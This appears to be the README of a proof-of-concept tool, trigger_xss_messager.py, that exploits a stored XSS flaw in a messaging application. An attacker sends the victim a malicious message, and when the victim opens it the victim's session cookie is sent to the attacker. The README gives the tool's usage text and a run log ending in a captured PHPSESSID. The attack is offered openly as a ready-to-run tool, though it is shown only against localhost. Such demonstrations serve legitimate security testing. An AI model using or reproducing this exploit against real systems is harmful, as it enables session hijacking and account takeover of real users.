# XSS Stealing Cookies and Hijacking Authenticated Sessions
In this scenario, an attacker (tester) sends a message containing an XSS payload to the target (mcooper), when mcooper opens a message from an attacker, XSS payload will trigger and sends a cookie to the attacker.

**Note:** target/victim : mcooper, attacker : tester


## PoC
```bash
$ python3 trigger_xss_messager.py -h                                              

    >> XSS Stealing Cookies and Hijacking Authenticated Sessions
    >> by twseptian

usage: trigger_xss_messager.py [-h] -t URL -u USERNAME -p PASSWORD

XSS Stealing Cookies and Hijacking Authenticated Sessions

optional arguments:
  -h, --help            show this help message and exit
  -t URL, --target URL  Target
  -u USERNAME, --username USERNAME
                        Username target
  -p PASSWORD, --password PASSWORD
                        Password target
```
The attacker must wait until the xss payload is triggered by the target
```bash
$ python3 trigger_xss_messager.py -t http://127.0.0.1/sm/ -u tester -p password   

    >> XSS Stealing Cookies and Hijacking Authenticated Sessions
    >> by twseptian

[✓] Logged in successfully
[*] Sending xss vector via message
[✓] XSS payload sent successfull
[*] XSS triggered capturing cookies to login
[✓] Grab victim's PHPSESSID: m9i7oshnd16afe932n6bgo3sj7 
```